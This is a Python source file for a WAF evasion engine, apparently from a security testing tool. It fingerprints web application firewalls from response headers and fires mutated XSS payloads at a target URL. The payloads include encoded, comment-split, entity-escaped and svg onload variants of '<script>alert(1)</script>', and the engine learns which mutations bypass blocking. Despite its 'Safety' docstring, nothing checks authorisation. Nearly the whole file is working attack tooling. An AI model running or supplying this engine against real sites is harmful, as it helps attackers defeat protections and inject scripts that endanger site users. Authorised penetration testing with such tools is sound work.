"""tools/waf_evasion.py

WAF Evasion & Adaptive Payload Mutation Engine.

Purpose:
- Detect WAF presence and blocking behavior
- Mutate payloads based on WAF feedback (adaptive strategy)
- Learn which mutation techniques work against specific WAFs
- Provide evidence-based bypass candidates

Safety:
- Only sends test payloads to user-specified endpoints
- Respects rate limits
- Logs all attempts for audit
"""

from __future__ import annotations

import json
import logging
import random
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

import requests

logger = logging.getLogger("elengenix.waf_evasion")

@dataclass
class MutationTechnique:
 name: str
 apply: callable
 waf_targets: List[str] = field(default_factory=list) # Which WAF types this works against

@dataclass
class WAFTestResult:
 payload: str
 techniques: List[str]
 blocked: bool
 status_code: int
 response_snippet: str
 waf_detected: Optional[str]
 confidence: float

class WAFEvasionEngine:
 """
 Adaptive WAF evasion engine with feedback loop.
 Learns which mutations work against detected WAF signatures.
 """

 # Known WAF indicators in responses
 WAF_SIGNATURES = {
 "cloudflare": ["cloudflare", "cf-ray", "__cfduid", "cloudflare-nginx"],
 "aws_waf": ["aws waf", "awselb", "x-amzn-requestid"],
 "modsecurity": ["mod_security", "modsecurity", "id="],
 "akamai": ["akamaighost", "akamai"],
 "incapsula": ["incap_ses", "visid_incap"],
 "sucuri": ["sucuri", "x-sucuri"],
 "fortinet": ["fortigate", "fortiweb"],
 "f5": ["f5", "bigip", "ts"],
 "imperva": ["imperva", "incapsula"],
 "datadog": ["datadog", "x-datadog"],
 }

 def __init__(self, base_url: str, timeout: int = 15, rate_limit_rps: float = 0.8):
 self.base_url = base_url.rstrip("/") + "/"
 self.timeout = timeout
 self.rate_limit_rps = max(0.2, float(rate_limit_rps))
 self._last_req_ts = 0.0
 self._learned_strategies: Dict[str, List[str]] = {} # WAF type -> effective techniques

 def _sleep_rate_limit(self) -> None:
 min_interval = 1.0 / self.rate_limit_rps
 now = time.time()
 dt = now - self._last_req_ts
 if dt < min_interval:
 time.sleep(min_interval - dt)
 self._last_req_ts = time.time()

 def _send_probe(self, url: str, payload: str, headers: Optional[Dict[str, str]] = None) -> Tuple[int, str, Dict[str, str]]:
 """Send probe request and return status, body, response headers."""
 self._sleep_rate_limit()
 h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
 if headers:
 h.update(headers)
 try:
 r = requests.get(
 url,
 params={"test": payload},
 headers=h,
 timeout=self.timeout,
 allow_redirects=False,
 )
 return r.status_code, r.text[:1500], dict(r.headers)
 except requests.exceptions.Timeout:
 return 0, "timeout", {}
 except Exception as e:
 return -1, str(e)[:200], {}

 def detect_waf(self, url: str, test_payload: str = "<script>alert(1)</script>") -> Tuple[Optional[str], float]:
 """
 Detect WAF presence and identify type.
 Returns (waf_type, confidence) or (None, 0.0)
 """
 status, body, resp_headers = self._send_probe(url, test_payload)

 # Check response headers
 header_text = " ".join([f"{k}:{v}" for k, v in resp_headers.items()]).lower()

 scores: Dict[str, int] = {}
 for waf_name, indicators in self.WAF_SIGNATURES.items():
 for ind in indicators:
 if ind.lower() in header_text:
 scores[waf_name] = scores.get(waf_name, 0) + 2
 if ind.lower() in body.lower():
 scores[waf_name] = scores.get(waf_name, 0) + 1

 # Block behavior heuristics
 if status in (403, 406, 409, 501, 502):
 # Likely blocked
 pass

 if not scores:
 return (None, 0.0)

 best = max(scores.items(), key=lambda x: x[1])
 confidence = min(0.95, best[1] / 5.0) # Normalize
 return (best[0], confidence)

 def _get_mutation_techniques(self) -> List[MutationTechnique]:
 """Return all available mutation techniques."""
 techniques = [
 MutationTechnique("urlencode", lambda p: urllib.parse.quote(p, safe=""), ["generic", "modsecurity"]),
 MutationTechnique("double_urlencode", lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""), ["generic"]),
 MutationTechnique("base64", lambda p: urllib.parse.quote(__import__("base64").b64encode(p.encode()).decode(), safe=""), ["generic", "aws_waf"]),
 MutationTechnique("case_random", self._case_randomize, ["generic", "cloudflare"]),
 MutationTechnique("comment_injection", self._insert_comments, ["modsecurity", "generic"]),
 MutationTechnique("unicode_escape", lambda p: p.encode("unicode_escape").decode(), ["generic"]),
 MutationTechnique("null_byte", lambda p: p.replace("<", "%00<").replace(">", "%00>"), ["generic"]),
 MutationTechnique("tab_newline", self._tab_newline_obfuscate, ["cloudflare", "generic"]),
 MutationTechnique("concat_break", self._concat_break, ["modsecurity"]),
 MutationTechnique("hex_entities", lambda p: "".join([f"&#x{ord(c):x};" for c in p]), ["cloudflare", "generic"]),
 MutationTechnique("decimal_entities", lambda p: "".join([f"&#{ord(c)};" for c in p]), ["cloudflare", "generic"]),
 MutationTechnique("svg_payload", lambda p: f"<svg/onload={p.replace('<script>', '').replace('</script>', '')}>", ["generic"]),
 ]
 return techniques

 def _case_randomize(self, payload: str) -> str:
 """Randomize case of alphabetic characters."""
 return "".join([c.upper() if random.random() > 0.5 else c.lower() for c in payload])

 def _insert_comments(self, payload: str) -> str:
 """Insert HTML/JS comments to break signatures."""
 # Insert between sensitive words
 result = payload
 result = re.sub(r"(alert)\s*\(", r"alert/*x*/(", result, flags=re.IGNORECASE)
 result = re.sub(r"(<script)", r"<sc<!--->ript", result, flags=re.IGNORECASE)
 return result

 def _tab_newline_obfuscate(self, payload: str) -> str:
 """Use tabs and newlines to break regex patterns."""
 return payload.replace(" ", "%09").replace(" ", "%0a")

 def _concat_break(self, payload: str) -> str:
 """Break strings with concatenation."""
 # For JS contexts
 if "alert" in payload.lower():
 return payload.replace("alert", "al" + "+" + "ert")
 return payload

 def generate_mutations(self, base_payload: str, waf_type: Optional[str] = None, max_variants: int = 20) -> List[Tuple[str, List[str]]]:
 """
 Generate mutated payloads.
 If waf_type known, prioritize techniques that work against it.
 """
 techniques = self._get_mutation_techniques()

 # Prioritize based on learned strategies
 if waf_type and waf_type in self._learned_strategies:
 effective = self._learned_strategies[waf_type]
 techniques.sort(key=lambda t: (0 if t.name in effective else 1, random.random()))

 variants: List[Tuple[str, List[str]]] = [(base_payload, ["original"])]

 for tech in techniques[:max_variants]:
 try:
 mutated = tech.apply(base_payload)
 if mutated != base_payload:
 variants.append((mutated, [tech.name]))
 except Exception as e:
 logger.debug(f"Mutation technique {tech.name} failed: {e}")

 # Combine techniques (chaining)
 if len(variants) > 3 and waf_type:
 # Try chaining top 2 techniques
 v1, t1 = variants[1]
 v2, t2 = variants[2]
 try:
 chained = urllib.parse.quote(v1, safe="") if "urlencode" not in t1 else v1
 variants.append((chained, t1 + t2))
 except Exception:
 pass

 # Deduplicate
 seen = set()
 unique = []
 for v, t in variants:
 if v not in seen and len(unique) < max_variants:
 seen.add(v)
 unique.append((v, t))

 return unique

 def test_bypass(
 self,
 target_url: str,
 base_payload: str,
 waf_type: Optional[str] = None,
 max_attempts: int = 15,
 ) -> List[WAFTestResult]:
 """
 Test mutations against target and learn which work.
 Returns list of results with bypass success indicators.
 """
 results: List[WAFTestResult] = []

 mutations = self.generate_mutations(base_payload, waf_type, max_attempts)

 for payload, techniques in mutations:
 status, body, resp_headers = self._send_probe(target_url, payload)

 # Determine if blocked
 blocked = status in (403, 406, 409, 501, 502, 503) or len(body) < 50

 # Detect WAF from response
 detected_waf, waf_conf = self.detect_waf(target_url, payload) if not waf_type else (waf_type, 0.8)

 result = WAFTestResult(
 payload=payload[:200],
 techniques=techniques,
 blocked=blocked,
 status_code=status,
 response_snippet=body[:300],
 waf_detected=detected_waf,
 confidence=0.9 if not blocked else 0.3,
 )
 results.append(result)

 # Learn from success
 if not blocked and detected_waf:
 if detected_waf not in self._learned_strategies:
 self._learned_strategies[detected_waf] = []
 for tech in techniques:
 if tech not in self._learned_strategies[detected_waf]:
 self._learned_strategies[detected_waf].append(tech)

 return results

 def get_best_bypass(self, results: List[WAFTestResult]) -> Optional[WAFTestResult]:
 """Return the best bypass candidate from test results."""
 unblocked = [r for r in results if not r.blocked]
 if not unblocked:
 return None
 # Return the one with highest confidence
 return max(unblocked, key=lambda r: r.confidence)

 def export_learned_strategies(self) -> Dict[str, List[str]]:
 """Export learned strategies for persistence."""
 return self._learned_strategies

 def import_learned_strategies(self, data: Dict[str, List[str]]) -> None:
 """Import previously learned strategies."""
 self._learned_strategies.update(data)
